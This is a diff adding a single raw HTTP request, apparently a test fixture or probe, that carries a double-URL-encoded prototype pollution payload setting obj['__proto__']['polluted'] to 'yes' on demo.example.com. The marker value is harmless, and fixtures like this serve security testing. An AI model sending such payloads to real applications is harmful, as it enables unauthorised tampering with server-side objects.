@@ -1,0 +1,4 @@
+GET /a?path=obj%255B%2522__proto__%2522%255D%255B%2522polluted%2522%255D%253D%2522yes%2522 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
